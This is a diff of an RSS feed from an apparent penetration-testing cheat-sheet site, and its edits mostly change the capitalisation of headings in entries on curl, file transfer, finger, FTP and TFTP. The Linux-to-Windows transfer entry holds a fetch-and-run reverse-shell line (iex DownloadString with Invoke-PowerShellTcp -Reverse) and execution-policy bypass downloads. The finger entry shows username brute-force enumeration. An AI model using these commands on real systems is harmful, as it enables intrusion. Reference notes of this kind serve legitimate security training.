@@ -19,14 +19,14 @@
       <link>https://tldrbins.github.io/connection_from_public_internet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
-      <description>Simply catch HTTP request webhook.site&#xA;Catch HTTP request and host a web server serveo.net ngrok # Start a local HTTP server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 3000 Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ... # Redirect http request to localhost:&amp;lt;LOCAL_PORT&amp;gt; ssh -R 80:localhost:&amp;lt;LOCAL_PORT&amp;gt; serveo.net $ ssh -R 80:localhost:3000 serveo.net Forwarding HTTP traffic from https://7ddf32e17a6ac5ce04a8ecbf782ca509.serveo.net ngrok http 80 Ref: ngrok Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
+      <description>Simply Catch HTTP Request webhook.site&#xA;Catch HTTP Request and Host a Web Server serveo.net ngrok # Start a local HTTP server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 3000 Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ... # Redirect http request to localhost:&amp;lt;LOCAL_PORT&amp;gt; ssh -R 80:localhost:&amp;lt;LOCAL_PORT&amp;gt; serveo.net $ ssh -R 80:localhost:3000 serveo.net Forwarding HTTP traffic from https://7ddf32e17a6ac5ce04a8ecbf782ca509.serveo.net ngrok http 80 Ref: ngrok Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
     </item>
     <item>
       <title>curl</title>
       <link>https://tldrbins.github.io/curl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/curl/</guid>
-      <description>curl # Show Header Only curl -I &amp;lt;TARGET&amp;gt; # Save as the Same Name as the File on the Server curl &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -O # GET Url-encoded Query curl -G --data-urlencode &amp;#39;&amp;lt;QUERY_STRING&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # POST Url-encoded Data curl --data-urlencode &amp;#39;&amp;lt;DATA&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # PUT a File curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # PUT a File (Authenticate) curl -X PUT -u &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # PUT a File as Raw Binary (Preserve Newlines and Control Characters) curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; --data-binary @&amp;lt;FILE&amp;gt; # POST a File with Form Param curl -X POST -F &amp;#39;&amp;lt;PARAM&amp;gt;=@&amp;lt;FILE&amp;gt;;type=&amp;lt;APPLICATION_TYPE&amp;gt;;filename=&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # POST a File in Raw-text Format (Not as Attachment) curl -X POST -F &amp;#39;&amp;lt;PARAM&amp;gt;=&amp;lt;&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Not to Handle Sequences of &amp;#39;/.</description>
+      <description>curl # Show header only curl -I &amp;lt;TARGET&amp;gt; # Save as the same name as the file on the server curl &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -O # GET url-encoded query curl -G --data-urlencode &amp;#39;&amp;lt;QUERY_STRING&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # POST url-encoded data curl --data-urlencode &amp;#39;&amp;lt;DATA&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # PUT a file curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # PUT a file (Authenticate) curl -X PUT -u &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # PUT a file as raw binary (Preserve newlines and control characters) curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; --data-binary @&amp;lt;FILE&amp;gt; # POST a file with form param curl -X POST -F &amp;#39;&amp;lt;PARAM&amp;gt;=@&amp;lt;FILE&amp;gt;;type=&amp;lt;APPLICATION_TYPE&amp;gt;;filename=&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # POST a file in raw-text format (Not as attachment) curl -X POST -F &amp;#39;&amp;lt;PARAM&amp;gt;=&amp;lt;&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Not to handle sequences of &amp;#39;/.</description>
     </item>
     <item>
       <title>File Transfer (Linux To Linux)</title>
@@ -40,7 +40,7 @@
       <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
-      <description>powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; # Wget powershell -ep bypass wget &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; # Curl powershell -ep bypass curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; Note: curl and wget are alias to Invoke-WebRequest&#xA;# Load into memory and Run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt;&amp;#39;);Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;LOCAL_IP&amp;gt; -Port &amp;lt;LOCAL_PORT&amp;gt; # Short version iex (iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -UseBasicParsing) Ref: rev.</description>
+      <description>powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; # Wget powershell -ep bypass wget &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; # Curl powershell -ep bypass curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; Note: curl and wget are alias to Invoke-WebRequest&#xA;# Load into memory and run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt;&amp;#39;);Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;LOCAL_IP&amp;gt; -Port &amp;lt;LOCAL_PORT&amp;gt; # Short version iex (iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -UseBasicParsing) Ref: rev.</description>
     </item>
     <item>
       <title>File Transfer (Windows To Linux)</title>
@@ -61,14 +61,14 @@
       <link>https://tldrbins.github.io/finger/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/finger/</guid>
-      <description>Basic # Check logged in users finger @&amp;lt;TARGET&amp;gt; # Check valid user finger &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; Brute force usernames perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t &amp;lt;TARGET&amp;gt; Ref: finger-user-enum</description>
+      <description>General # Check logged in users finger @&amp;lt;TARGET&amp;gt; # Check valid user finger &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; Brute Force Usernames perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t &amp;lt;TARGET&amp;gt; Ref: finger-user-enum</description>
     </item>
     <item>
       <title>FTP</title>
       <link>https://tldrbins.github.io/ftp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ftp/</guid>
-      <description>Config Location /etc/vsftpd.conf Basic # Anonymous Login ftp ftp://anonymous:@&amp;lt;TARGET&amp;gt; # Connect ftp ftp://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; # Over SSL lftp &amp;lt;TARGET&amp;gt; # Fix cert error echo -n &amp;#39;set ssl:verify-certificate no&amp;#39; &amp;gt;&amp;gt; ~/.lftp/rc # List ls # Switch to binary transfer mode bin # Download get &amp;#34;&amp;lt;FILE&amp;gt;&amp;#34; # Upload put &amp;#34;&amp;lt;FILE&amp;gt;&amp;#34; # Connect over tunnel passive # Exit quit Recusive download # Anonymous login wget -r ftp://anonymous:@&amp;lt;TARGET&amp;gt; # With creds wget --user &amp;lt;USER&amp;gt; --password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -m ftp://&amp;lt;TARGET&amp;gt; Note: Always check what&amp;rsquo;s in there first</description>
+      <description>Config Location /etc/vsftpd.conf General # Anonymous ftp ftp://anonymous:@&amp;lt;TARGET&amp;gt; # Password ftp ftp://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; # Over SSL lftp &amp;lt;TARGET&amp;gt; # Fix cert error echo -n &amp;#39;set ssl:verify-certificate no&amp;#39; &amp;gt;&amp;gt; ~/.lftp/rc # List ls # Switch to binary transfer mode bin # Download get &amp;#34;&amp;lt;FILE&amp;gt;&amp;#34; # Upload put &amp;#34;&amp;lt;FILE&amp;gt;&amp;#34; # Connect over tunnel passive # Exit quit Recusive download # Anonymous wget -r ftp://anonymous:@&amp;lt;TARGET&amp;gt; # Password wget --user &amp;lt;USER&amp;gt; --password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -m ftp://&amp;lt;TARGET&amp;gt; Note: Always check what&amp;rsquo;s in there first</description>
     </item>
     <item>
       <title>SMB Server</title>
@@ -82,7 +82,7 @@
       <link>https://tldrbins.github.io/tftp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/tftp/</guid>
-      <description>TFTP # Connect tftp &amp;lt;TARGET&amp;gt; # Download get &amp;lt;FILE&amp;gt; # Exit quit Note: You need to know the exact filename, there is no directory listing in tftp</description>
+      <description>General # Connect tftp &amp;lt;TARGET&amp;gt; # Download get &amp;lt;FILE&amp;gt; # Exit quit Note: You need to know the exact filename, there is no directory listing in tftp</description>
     </item>
     <item>
       <title>Winrm from Windows VM</title>
